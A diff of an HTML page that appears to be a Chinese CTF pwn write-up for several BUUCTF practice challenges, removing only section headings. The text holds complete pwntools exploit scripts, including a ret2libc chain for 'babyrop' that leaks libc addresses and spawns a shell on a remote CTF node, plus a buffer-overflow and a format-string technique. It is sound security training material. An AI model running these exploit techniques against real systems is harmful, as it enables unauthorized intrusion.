@@ -6879,7 +6879,7 @@
 
 
 
-<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>首先还是看一下安全机制</p>
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>首先还是看一下安全机制</p>
 <p><img src="image-20200521213720001.png"></p>
 <p>是个64位程序，开了NX</p>
 <p>运行的时候是一个加密解密的程序</p>
@@ -6908,7 +6908,7 @@
 
 
 
-<h3 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h3><p>逆向代码中看到调用了puts，所以首先可以利用这个puts函数泄漏libc的基地址</p>
+<p>逆向代码中看到调用了puts，所以首先可以利用这个puts函数泄漏libc的基地址</p>
 <p>64位程序传递参数时，如果参数少于7个，会依次放在rdi、rsi、rdx、rcx、r8、r9中</p>
 <p>后面的参数才会放在栈中</p>
 <p>所以首先要获取到的gadget就是能从栈中将数据传入到rdi的</p>
@@ -6929,7 +6929,7 @@
 
 
 
-<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先checksec检查安全机制</p>
+<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>首先checksec检查安全机制</p>
 <p><img src="image-20200625121418899.png" alt="image-20200625121418899"></p>
 <p>这还是很少见的开启Full RELRO的程序</p>
 <p>拖到ida看一下主函数的逻辑</p>
@@ -6948,7 +6948,7 @@
 <p>这个函数的输入是上面返回的v5，大小是我们可以控制的</p>
 <p>当这个字节的值是127时，可以从stdin读取长度<code>0xC8</code>的内容，其他值时就可以读取a1长度的内容</p>
 <p>而buf距离ebp有E7h，因此肯定要尽可能的大，这里尽量控制返回值为0xff，必须要求e7h以上才可以</p>
-<h3 id="编写payload"><a href="#编写payload" class="headerlink" title="编写payload"></a>编写payload</h3><h4 id="溢出sub-804871f"><a href="#溢出sub-804871f" class="headerlink" title="溢出sub_804871f"></a>溢出sub_804871f</h4><p>整体思路就是利用<code>sub_804871F</code>来溢出控制返回值v5，再利用<code>sub_80487d0</code>来溢出拿到shell</p>
+<p>整体思路就是利用<code>sub_804871F</code>来溢出控制返回值v5，再利用<code>sub_80487d0</code>来溢出拿到shell</p>
 <p>但是利用<code>sub_804871f</code>的前提是要绕过<code>strncmp</code>函数</p>
 <p>仔细看一下这个比较</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v1=<span class="built_in">strlen</span>(buf);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf,&amp;s,v1))</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
@@ -6958,7 +6958,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">6</span> + <span class="string">&#x27;\xff&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>这样就可以溢出<code>sub_804871F</code>，控制返回值v5值为0xff</p>
-<h4 id="溢出得到write真实地址"><a href="#溢出得到write真实地址" class="headerlink" title="溢出得到write真实地址"></a>溢出得到write真实地址</h4><p>控制了返回值v5之后，在80487d0这个函数这里就可以读取长度ffh的内容了</p>
+<p>控制了返回值v5之后，在80487d0这个函数这里就可以读取长度ffh的内容了</p>
 <p>这里payload就和常规的rop差不多了，首先泄漏write的地址，计算出libc基地址</p>
 <p>之后利用gadget搜索跳转到<code>execve(&quot;bin/sh&quot;)</code>即可</p>
 <p>首先是填充buf到ebp的e7h，之后填充4个字节的ebp，最后是返回值</p>
@@ -6967,7 +6967,7 @@
 
 <p>这个payload执行完成之后会输出write的真实地址，并且再一次回到程序开始运行的地方</p>
 <p>之后计算出libc的基地址即可</p>
-<h4 id="溢出得到shell"><a href="#溢出得到shell" class="headerlink" title="溢出得到shell"></a>溢出得到shell</h4><p>在得到基地址之后，再一次执行上面的流程，跳到gadget的位置即可</p>
+<p>在得到基地址之后，再一次执行上面的流程，跳到gadget的位置即可</p>
 <p><img src="image-20200625133907380.png" alt="image-20200625133907380"></p>
 <p>首先要把控制返回值v5的payload发送一遍，之后的payload应该是下面这样子</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(execve_sh)</span><br></pre></td></tr></table></figure>
@@ -6981,7 +6981,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28595&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x8048825</span></span><br><span class="line">bin_sh_offset = next(libc.search(<span class="string">&quot;bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(start) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = write_real - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh_str = libc_base + bin_sh_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve_sh = libc_base + 0x5f066</span></span><br><span class="line"><span class="comment"># 0x3a80c</span></span><br><span class="line"><span class="comment"># 0x3a80e</span></span><br><span class="line"><span class="comment"># 0x3a812</span></span><br><span class="line"><span class="comment"># 0x3a819</span></span><br><span class="line"><span class="comment"># 0x5f065</span></span><br><span class="line"><span class="comment"># 0x5f066</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(system_addr) + <span class="string">&quot;AAAA&quot;</span> + p32(bin_sh_str)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>调用system函数的时候，<code>aaaa</code>是system的返回地址，用来占位</p>
-<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><h3 id="基本分析-1"><a href="#基本分析-1" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先checksec检查安全机制</p>
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>首先checksec检查安全机制</p>
 <p><img src="image-20200625194857123.png" alt="image-20200625194857123"></p>
 <p>同样是开启了NX的程序</p>
 <p>可能也是一道ROP的题目</p>
@@ -6989,7 +6989,7 @@
 <p>所以主要改的地方就是libc的利用这里</p>
 <p>从原本的直接读本地libc，改成利用<code>LibcSearcher</code></p>
 <p>两道题目甚至可以用同一个exp</p>
-<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><h3 id="基本分析-2"><a href="#基本分析-2" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先看到main函数</p>
+<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>首先看到main函数</p>
 <p><img src="image-20200730150103790.png" alt="image-20200730150103790"></p>
 <p>一个printf一个gets，main函数的逻辑还是挺简单的</p>
 <p>看到旁边的函数，有一个<code>get_flag</code></p>
@@ -7058,7 +7058,7 @@
 
 
 
-<h2 id="第五空间2019决赛PWN5"><a href="#第五空间2019决赛PWN5" class="headerlink" title="第五空间2019决赛PWN5"></a>第五空间2019决赛PWN5</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>查看程序的安全机制</p>
+<h2 id="第五空间2019决赛PWN5"><a href="#第五空间2019决赛PWN5" class="headerlink" title="第五空间2019决赛PWN5"></a>第五空间2019决赛PWN5</h2><p>查看程序的安全机制</p>
 <p><img src="buuctf-pwn1/image-20200907171415275.png" alt="image-20200907171415275"></p>
 <p>安全机制开启了好几个，除了PIE都开了</p>
 <p>IDA反汇编查看main函数</p>
@@ -7071,7 +7071,7 @@
 <p>根据上面代码的思路，首先用格式化字符串漏洞打印出<code>unk_804C044</code>缓冲区中数字的值</p>
 <p>之后再输入密码的时候输入这个数字就可以了</p>
 <p>那么这里需要涉及到的问题就是格式化字符串漏洞的任意地址读问题</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>输入<code>aaaa</code>以及若干个<code>%x</code>，可以根据输出中<code>aaaa</code>字符出现的偏移确定buf和栈帧的距离</p>
+<p>输入<code>aaaa</code>以及若干个<code>%x</code>，可以根据输出中<code>aaaa</code>字符出现的偏移确定buf和栈帧的距离</p>
 <p><img src="buuctf-pwn1/image-20200907172756891.png" alt="image-20200907172756891"></p>
 <h2 id="Jarvisoj-level0"><a href="#Jarvisoj-level0" class="headerlink" title="Jarvisoj_level0"></a>Jarvisoj_level0</h2><p>这道题就是一个很基础的pwn，溢出之后直接覆盖返回地址为get_flag的地址就可以</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./level0&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28376</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
